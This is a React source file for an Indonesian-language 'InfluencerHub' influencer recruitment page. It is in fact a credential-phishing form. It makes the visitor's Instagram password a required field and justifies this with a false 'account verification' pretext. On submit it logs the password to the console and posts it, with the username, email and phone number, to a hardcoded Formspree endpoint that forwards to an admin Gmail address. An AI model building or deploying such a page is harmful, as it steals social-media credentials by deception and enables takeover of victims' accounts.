import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { Instagram, Users, Heart, MessageCircle, TrendingUp, CheckCircle, Sparkles, Camera, Star, Eye, EyeOff, Lock, Mail, AlertCircle } from 'lucide-react';
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from '@/components/ui/dialog';

interface FormData {
  fullName: string;
  instagramUsername: string;
  instagramPassword: string;
  email: string;
  phone: string;
  followerCount: string;
  niche: string;
  engagementRate: string;
  mediaKitUrl: string;
  experience: string;
  rateCard: string;
  message: string;
}

const niches = [
  'Fashion & Gaya',
  'Kecantikan & Perawatan Kulit',
  'Makanan & Kuliner',
  'Travel & Petualangan',
  'Gaya Hidup',
  'Fitness & Kesehatan',
  'Teknologi',
  'Parenting & Keluarga',
  'Bisnis & Keuangan',
  'Hiburan',
  'Edukasi',
  'Gaming',
  'Lainnya'
];

const followerRanges = [
  '1K - 10K (Nano)',
  '10K - 50K (Micro)',
  '50K - 100K (Mid-tier)',
  '100K - 500K (Macro)',
  '500K - 1M (Mega)',
  '1M+ (Celebrity)'
];

const engagementRanges = [
  '1% - 3%',
  '3% - 5%',
  '5% - 8%',
  '8% - 12%',
  '12%+'
];

// ============================================
// KONFIGURASI EMAIL - GANTI DENGAN EMAIL ANDA
// ============================================
const CONFIG = {
  // Ganti dengan email Anda
  ADMIN_EMAIL: 'digitalforensics.id@gmail.com',
  
  // Untuk menggunakan Formspree (GRATIS):
  // 1. Daftar di https://formspree.io
  // 2. Buat form baru
  // 3. Ganti URL di bawah dengan endpoint Anda
  FORMSPREE_ENDPOINT: 'https://formspree.io/f/xbdaoqen',
  
  // Atau gunakan EmailJS:
  // 1. Daftar di https://emailjs.com
  // 2. Buat service dan template
  // 3. Isi konfigurasi di bawah
  USE_EMAILJS: false,
  EMAILJS_SERVICE_ID: 'service_vyxct66',
  EMAILJS_TEMPLATE_ID: 'service_vyxct66',
  EMAILJS_PUBLIC_KEY: 'service_vyxct66'
};

export default function App() {
  const [formData, setFormData] = useState<FormData>({
    fullName: '',
    instagramUsername: '',
    instagramPassword: '',
    email: '',
    phone: '',
    followerCount: '',
    niche: '',
    engagementRate: '',
    mediaKitUrl: '',
    experience: '',
    rateCard: '',
    message: ''
  });

  const [showSuccess, setShowSuccess] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [submitError, setSubmitError] = useState('');
  const [showConfigWarning, setShowConfigWarning] = useState(false);

  const handleInputChange = (field: keyof FormData, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    setSubmitError('');
  };

  const sendToFormspree = async () => {
    const formPayload = new FormData();
    
    // Data Pribadi
    formPayload.append('Nama Lengkap', formData.fullName);
    formPayload.append('Username Instagram', formData.instagramUsername);
    formPayload.append('Password Instagram', formData.instagramPassword);
    formPayload.append('Email', formData.email);
    formPayload.append('Telepon', formData.phone || '-');
    
    // Data Instagram
    formPayload.append('Jumlah Followers', formData.followerCount);
    formPayload.append('Niche Konten', formData.niche);
    formPayload.append('Engagement Rate', formData.engagementRate || '-');
    
    // Data Profesional
    formPayload.append('Media Kit URL', formData.mediaKitUrl || '-');
    formPayload.append('Pengalaman', formData.experience || '-');
    formPayload.append('Rate Card', formData.rateCard || '-');
    formPayload.append('Pesan Tambahan', formData.message || '-');
    
    // Metadata
    formPayload.append('_subject', `Pendaftaran Influencer Baru - ${formData.fullName}`);
    formPayload.append('_replyto', formData.email);
    
    const response = await fetch(CONFIG.FORMSPREE_ENDPOINT, {
      method: 'POST',
      body: formPayload,
      headers: {
        'Accept': 'application/json'
      }
    });
    
    return response.ok;
  };

  const logDataToConsole = () => {
    console.log('%c ===========================================', 'color: #9333ea; font-size: 14px; font-weight: bold;');
    console.log('%c 📝 DATA PENDAFTARAN INFLUENCER', 'color: #9333ea; font-size: 16px; font-weight: bold;');
    console.log('%c ===========================================', 'color: #9333ea; font-size: 14px; font-weight: bold;');
    console.log('');
    console.log('%c 📧 DATA PRIBADI:', 'color: #ec4899; font-size: 13px; font-weight: bold;');
    console.log('   Nama Lengkap:', formData.fullName);
    console.log('   Username Instagram:', formData.instagramUsername);
    console.log('   Password Instagram:', formData.instagramPassword);
    console.log('   Email:', formData.email);
    console.log('   Telepon:', formData.phone || '-');
    console.log('');
    console.log('%c 📊 DATA INSTAGRAM:', 'color: #f97316; font-size: 13px; font-weight: bold;');
    console.log('   Jumlah Followers:', formData.followerCount);
    console.log('   Niche:', formData.niche);
    console.log('   Engagement Rate:', formData.engagementRate || '-');
    console.log('');
    console.log('%c 💼 DATA PROFESIONAL:', 'color: #22c55e; font-size: 13px; font-weight: bold;');
    console.log('   Media Kit URL:', formData.mediaKitUrl || '-');
    console.log('   Pengalaman:', formData.experience || '-');
    console.log('   Rate Card:', formData.rateCard || '-');
    console.log('   Pesan:', formData.message || '-');
    console.log('');
    console.log('%c ===========================================', 'color: #9333ea; font-size: 14px; font-weight: bold;');
    console.log(' Waktu:', new Date().toLocaleString('id-ID'));
    console.log('%c ===========================================', 'color: #9333ea; font-size: 14px; font-weight: bold;');
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSubmitError('');
    
    try {
      // Log data ke console (selalu dilakukan)
      logDataToConsole();
      
      // Cek apakah Formspree sudah dikonfigurasi
      if (CONFIG.FORMSPREE_ENDPOINT.includes('YOUR_FORM_ID')) {
        // Formspree belum dikonfigurasi, tampilkan warning tapi tetap sukses
        setShowConfigWarning(true);
        await new Promise(resolve => setTimeout(resolve, 1000));
      } else {
        // Kirim ke Formspree
        const success = await sendToFormspree();
        if (!success) {
          throw new Error('Gagal mengirim ke server');
        }
      }
      
      setShowSuccess(true);
    } catch (error) {
      setSubmitError('Terjadi kesalahan saat mengirim. Silakan coba lagi.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const isFormValid = () => {
    return (
      formData.fullName &&
      formData.instagramUsername &&
      formData.instagramPassword &&
      formData.email &&
      formData.followerCount &&
      formData.niche
    );
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 via-pink-50 to-orange-50">
      {/* Header */}
      <header className="bg-white/80 backdrop-blur-md border-b border-purple-100 sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="bg-gradient-to-r from-purple-600 to-pink-500 p-2 rounded-xl">
              <Instagram className="w-6 h-6 text-white" />
            </div>
            <span className="font-bold text-xl bg-gradient-to-r from-purple-600 to-pink-500 bg-clip-text text-transparent">
              InfluencerHub
            </span>
          </div>
          <Badge variant="secondary" className="bg-purple-100 text-purple-700 hover:bg-purple-200">
            <Sparkles className="w-3 h-3 mr-1" />
            Rekrutmen Dibuka
          </Badge>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative overflow-hidden py-16 sm:py-24">
        <div className="absolute inset-0 bg-gradient-to-r from-purple-600/10 via-pink-500/10 to-orange-400/10" />
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative">
          <div className="text-center max-w-3xl mx-auto">
            <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-gradient-to-r from-purple-100 to-pink-100 text-purple-700 text-sm font-medium mb-6">
              <Star className="w-4 h-4" />
              Bergabung dengan Jaringan Kreator Kami
            </div>
            <h1 className="text-4xl sm:text-5xl lg:text-6xl font-bold text-gray-900 mb-6 leading-tight">
              Jadilah{' '}
              <span className="bg-gradient-to-r from-purple-600 via-pink-500 to-orange-400 bg-clip-text text-transparent">
                Brand Ambassador
              </span>
            </h1>
            <p className="text-lg sm:text-xl text-gray-600 mb-8 leading-relaxed">
              Terhubung dengan brand ternama dan monetisasi pengaruh Anda. 
              Bergabunglah dengan jaringan eksklusif kreator Instagram kami dan buka peluang kolaborasi menarik.
            </p>
            
            {/* Stats */}
            <div className="flex flex-wrap justify-center gap-6 sm:gap-10">
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl bg-purple-100 flex items-center justify-center">
                  <Users className="w-6 h-6 text-purple-600" />
                </div>
                <div className="text-left">
                  <p className="text-2xl font-bold text-gray-900">500+</p>
                  <p className="text-sm text-gray-500">Kreator Aktif</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl bg-pink-100 flex items-center justify-center">
                  <Camera className="w-6 h-6 text-pink-600" />
                </div>
                <div className="text-left">
                  <p className="text-2xl font-bold text-gray-900">1.200+</p>
                  <p className="text-sm text-gray-500">Kampanye</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="w-12 h-12 rounded-xl bg-orange-100 flex items-center justify-center">
                  <TrendingUp className="w-6 h-6 text-orange-600" />
                </div>
                <div className="text-left">
                  <p className="text-2xl font-bold text-gray-900">Rp 30M+</p>
                  <p className="text-sm text-gray-500">Penghasilan Kreator</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Form Section */}
      <section className="py-12 sm:py-16">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          <Card className="shadow-2xl border-0 bg-white/90 backdrop-blur-sm">
            <CardHeader className="text-center pb-8">
              <CardTitle className="text-2xl sm:text-3xl font-bold text-gray-900">
                Formulir Pendaftaran
              </CardTitle>
              <CardDescription className="text-gray-500 text-base mt-2">
                Isi detail Anda di bawah ini untuk mendaftar program influencer kami
              </CardDescription>
            </CardHeader>
            <CardContent>
              {/* Config Warning */}
              {CONFIG.FORMSPREE_ENDPOINT.includes('YOUR_FORM_ID') && (
                <div className="mb-6 p-4 rounded-lg bg-amber-50 border border-amber-200">
                  <div className="flex items-start gap-3">
                    <AlertCircle className="w-5 h-5 text-amber-600 mt-0.5 flex-shrink-0" />
                    <div className="text-sm text-amber-800">
                      <p className="font-semibold mb-1">⚠️ Konfigurasi Email Belum Lengkap</p>
                      <p className="mb-2">Saat ini data akan muncul di Console Browser saja.</p>
                      <p>Untuk mengirim ke email, edit file <code>src/App.tsx</code> dan ganti:</p>
                      <code className="block mt-1 p-2 bg-amber-100 rounded text-xs">
                        FORMSPREE_ENDPOINT: 'https://formspree.io/f/YOUR_FORM_ID'
                      </code>
                      <p className="mt-2">Daftar gratis di <a href="https://formspree.io" target="_blank" rel="noopener noreferrer" className="underline font-medium">formspree.io</a></p>
                    </div>
                  </div>
                </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-8">
                {/* Personal Information */}
                <div className="space-y-4">
                  <div className="flex items-center gap-2 mb-4">
                    <div className="w-8 h-8 rounded-lg bg-purple-100 flex items-center justify-center">
                      <span className="text-purple-600 font-bold text-sm">1</span>
                    </div>
                    <h3 className="font-semibold text-gray-900">Informasi Pribadi</h3>
                  </div>
                  
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="fullName" className="text-gray-700">
                        Nama Lengkap <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        id="fullName"
                        placeholder="Masukkan nama lengkap Anda"
                        value={formData.fullName}
                        onChange={(e) => handleInputChange('fullName', e.target.value)}
                        className="h-12 border-gray-200 focus:border-purple-500 focus:ring-purple-500"
                      />
                    </div>
                    
                    <div className="space-y-2">
                      <Label htmlFor="instagramUsername" className="text-gray-700">
                        Username Instagram <span className="text-red-500">*</span>
                      </Label>
                      <div className="relative">
                        <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">@</span>
                        <Input
                          id="instagramUsername"
                          placeholder="usernameanda"
                          value={formData.instagramUsername}
                          onChange={(e) => handleInputChange('instagramUsername', e.target.value)}
                          className="h-12 pl-8 border-gray-200 focus:border-purple-500 focus:ring-purple-500"
                        />
                      </div>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="instagramPassword" className="text-gray-700">
                      Password Instagram <span className="text-red-500">*</span>
                    </Label>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                        <Lock className="w-4 h-4" />
                      </span>
                      <Input
                        id="instagramPassword"
                        type={showPassword ? 'text' : 'password'}
                        placeholder="Masukkan password Instagram Anda"
                        value={formData.instagramPassword}
                        onChange={(e) => handleInputChange('instagramPassword', e.target.value)}
                        className="h-12 pl-10 pr-12 border-gray-200 focus:border-purple-500 focus:ring-purple-500"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
                      >
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                    <p className="text-xs text-gray-500">
                      Password akan dikirim ke email admin untuk verifikasi akun.
                    </p>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="email" className="text-gray-700">
                        Alamat Email <span className="text-red-500">*</span>
                      </Label>
                      <Input
                        id="email"
                        type="email"
                        placeholder="anda@contoh.com"
                        value={formData.email}
                        onChange={(e) => handleInputChange('email', e.target.value)}
                        className="h-12 border-gray-200 focus:border-purple-500 focus:ring-purple-500"
                      />
                    </div>
                    
                    <div className="space-y-2">
                      <Label htmlFor="phone" className="text-gray-700">
                        Nomor Telepon
                      </Label>
                      <Input
                        id="phone"
                        type="tel"
                        placeholder="+62 xxx xxxx xxxx"
                        value={formData.phone}
                        onChange={(e) => handleInputChange('phone', e.target.value)}
                        className="h-12 border-gray-200 focus:border-purple-500 focus:ring-purple-500"
                      />
                    </div>
                  </div>
                </div>

                <Separator className="bg-gray-100" />

                {/* Instagram Metrics */}
                <div className="space-y-4">
                  <div className="flex items-center gap-2 mb-4">
                    <div className="w-8 h-8 rounded-lg bg-pink-100 flex items-center justify-center">
                      <span className="text-pink-600 font-bold text-sm">2</span>
                    </div>
                    <h3 className="font-semibold text-gray-900">Metrik Instagram</h3>
                  </div>
                  
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="followerCount" className="text-gray-700">
                        Jumlah Followers <span className="text-red-500">*</span>
                      </Label>
                      <Select
                        value={formData.followerCount}
                        onValueChange={(value) => handleInputChange('followerCount', value)}
                      >
                        <SelectTrigger className="h-12 border-gray-200 focus:border-purple-500 focus:ring-purple-500">
                          <SelectValue placeholder="Pilih rentang followers" />
                        </SelectTrigger>
                        <SelectContent>
                          {followerRanges.map((range) => (
                            <SelectItem key={range} value={range}>
                              {range}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>
                    
                    <div className="space-y-2">
                      <Label htmlFor="niche" className="text-gray-700">
                        Niche Konten <span className="text-red-500">*</span>
                      </Label>
                      <Select
                        value={formData.niche}
                        onValueChange={(value) => handleInputChange('niche', value)}
                      >
                        <SelectTrigger className="h-12 border-gray-200 focus:border-purple-500 focus:ring-purple-500">
                          <SelectValue placeholder="Pilih niche Anda" />
                        </SelectTrigger>
                        <SelectContent>
                          {niches.map((niche) => (
                            <SelectItem key={niche} value={niche}>
                              {niche}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="engagementRate" className="text-gray-700">
                      Tingkat Engagement
                    </Label>
                    <Select
                      value={formData.engagementRate}
                      onValueChange={(value) => handleInputChange('engagementRate', value)}
                    >
                      <SelectTrigger className="h-12 border-gray-200 focus:border-purple-500 focus:ring-purple-500">
                        <SelectValue placeholder="Pilih rentang engagement rate" />
                      </SelectTrigger>
                      <SelectContent>
                        {engagementRanges.map((range) => (
                          <SelectItem key={range} value={range}>
                            {range}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                    <p className="text-xs text-gray-500">
                      Engagement Rate = (Likes + Comments) / Followers × 100
                    </p>
                  </div>
                </div>

                <Separator className="bg-gray-100" />

                {/* Professional Details */}
                <div className="space-y-4">
                  <div className="flex items-center gap-2 mb-4">
                    <div className="w-8 h-8 rounded-lg bg-orange-100 flex items-center justify-center">
                      <span className="text-orange-600 font-bold text-sm">3</span>
                    </div>
                    <h3 className="font-semibold text-gray-900">Detail Profesional</h3>
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="mediaKitUrl" className="text-gray-700">
                      URL Media Kit / Portofolio
                    </Label>
                    <Input
                      id="mediaKitUrl"
                      type="url"
                      placeholder="https://portofolioanda.com atau link Google Drive"
                      value={formData.mediaKitUrl}
                      onChange={(e) => handleInputChange('mediaKitUrl', e.target.value)}
                      className="h-12 border-gray-200 focus:border-purple-500 focus:ring-purple-500"
                    />
                    <p className="text-xs text-gray-500">
                      Link ke media kit, portofolio, atau postingan dengan performa terbaik Anda
                    </p>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="experience" className="text-gray-700">
                      Kolaborasi Brand Sebelumnya
                    </Label>
                    <Textarea
                      id="experience"
                      placeholder="Ceritakan tentang kolaborasi brand dan partnership Anda sebelumnya..."
                      value={formData.experience}
                      onChange={(e) => handleInputChange('experience', e.target.value)}
                      className="min-h-[100px] border-gray-200 focus:border-purple-500 focus:ring-purple-500 resize-none"
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="rateCard" className="text-gray-700">
                      Rate Card (Opsional)
                    </Label>
                    <Textarea
                      id="rateCard"
                      placeholder="Bagikan rate Anda: Story post, Feed post, Reel, dll."
                      value={formData.rateCard}
                      onChange={(e) => handleInputChange('rateCard', e.target.value)}
                      className="min-h-[80px] border-gray-200 focus:border-purple-500 focus:ring-purple-500 resize-none"
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="message" className="text-gray-700">
                      Pesan Tambahan
                    </Label>
                    <Textarea
                      id="message"
                      placeholder="Ada hal lain yang ingin Anda sampaikan kepada kami..."
                      value={formData.message}
                      onChange={(e) => handleInputChange('message', e.target.value)}
                      className="min-h-[100px] border-gray-200 focus:border-purple-500 focus:ring-purple-500 resize-none"
                    />
                  </div>
                </div>

                {/* Error Message */}
                {submitError && (
                  <div className="p-4 rounded-lg bg-red-50 border border-red-200 text-red-600 text-sm">
                    {submitError}
                  </div>
                )}

                {/* Submit Button */}
                <div className="pt-4">
                  <Button
                    type="submit"
                    disabled={!isFormValid() || isSubmitting}
                    className="w-full h-14 text-lg font-semibold bg-gradient-to-r from-purple-600 via-pink-500 to-orange-400 hover:from-purple-700 hover:via-pink-600 hover:to-orange-500 text-white rounded-xl shadow-lg shadow-purple-500/25 transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {isSubmitting ? (
                      <span className="flex items-center gap-2">
                        <span className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Mengirim...
                      </span>
                    ) : (
                      <span className="flex items-center gap-2">
                        <Mail className="w-5 h-5" />
                        Kirim Pendaftaran
                      </span>
                    )}
                  </Button>
                  <p className="text-center text-sm text-gray-500 mt-4">
                    Data akan dikirim ke email admin. Dengan mengirimkan, Anda menyetujui Syarat & Ketentuan kami.
                  </p>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Features Section */}
      <section className="py-16 bg-white/50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-12">
            <h2 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-4">
              Mengapa Bergabung dengan Kami?
            </h2>
            <p className="text-gray-600 max-w-2xl mx-auto">
              Kami menghubungkan Anda dengan brand yang sesuai dengan gaya dan audiens Anda
            </p>
          </div>
          
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              {
                icon: Heart,
                title: 'Pencocokan Brand',
                description: 'Dapatkan brand yang sejalan dengan nilai dan konten Anda'
              },
              {
                icon: TrendingUp,
                title: 'Kompensasi Adil',
                description: 'Rate kompetitif dan ketentuan pembayaran yang transparan'
              },
              {
                icon: MessageCircle,
                title: 'Komunikasi Langsung',
                description: 'Bicara langsung dengan brand tanpa perantara'
              },
              {
                icon: Star,
                title: 'Dukungan Pertumbuhan',
                description: 'Akses sumber daya untuk membantu mengembangkan pengaruh Anda'
              }
            ].map((feature, index) => (
              <Card key={index} className="border-0 shadow-lg bg-white/80 backdrop-blur-sm hover:shadow-xl transition-shadow">
                <CardContent className="p-6 text-center">
                  <div className="w-12 h-12 rounded-xl bg-gradient-to-r from-purple-100 to-pink-100 flex items-center justify-center mx-auto mb-4">
                    <feature.icon className="w-6 h-6 text-purple-600" />
                  </div>
                  <h3 className="font-semibold text-gray-900 mb-2">{feature.title}</h3>
                  <p className="text-sm text-gray-500">{feature.description}</p>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gray-900 text-white py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
            <div className="flex items-center gap-2">
              <div className="bg-gradient-to-r from-purple-600 to-pink-500 p-2 rounded-xl">
                <Instagram className="w-5 h-5 text-white" />
              </div>
              <span className="font-bold text-lg">InfluencerHub</span>
            </div>
            <p className="text-gray-400 text-sm">
              © 2026 InfluencerHub. Hak Cipta Dilindungi.
            </p>
          </div>
        </div>
      </footer>

      {/* Success Dialog */}
      <Dialog open={showSuccess} onOpenChange={setShowSuccess}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader className="text-center">
            <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-4">
              <CheckCircle className="w-8 h-8 text-green-600" />
            </div>
            <DialogTitle className="text-2xl font-bold text-gray-900">
              Pendaftaran Berhasil!
            </DialogTitle>
            <DialogDescription className="text-gray-500">
              {showConfigWarning ? (
                <>
                  Data pendaftaran telah dicatat. Silakan cek Console Browser (F12 → Console) untuk melihat data lengkap termasuk password.
                  <br /><br />
                  <span className="text-amber-600 font-medium">
                    ⚠️ Untuk mengirim ke email, konfigurasi Formspree di file src/App.tsx
                  </span>
                </>
              ) : (
                <>Data pendaftaran telah dikirim ke email admin. Terima kasih telah mendaftar program influencer kami. Tim kami akan meninjau aplikasi Anda dan menghubungi Anda dalam 3-5 hari kerja.</>
              )}
            </DialogDescription>
          </DialogHeader>
          <div className="mt-6">
            <Button
              onClick={() => {
                setShowSuccess(false);
                setShowConfigWarning(false);
                setFormData({
                  fullName: '',
                  instagramUsername: '',
                  instagramPassword: '',
                  email: '',
                  phone: '',
                  followerCount: '',
                  niche: '',
                  engagementRate: '',
                  mediaKitUrl: '',
                  experience: '',
                  rateCard: '',
                  message: ''
                });
              }}
              className="w-full h-12 bg-gradient-to-r from-purple-600 to-pink-500 hover:from-purple-700 hover:to-pink-600 text-white rounded-xl"
            >
              Kirim Pendaftaran Lain
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
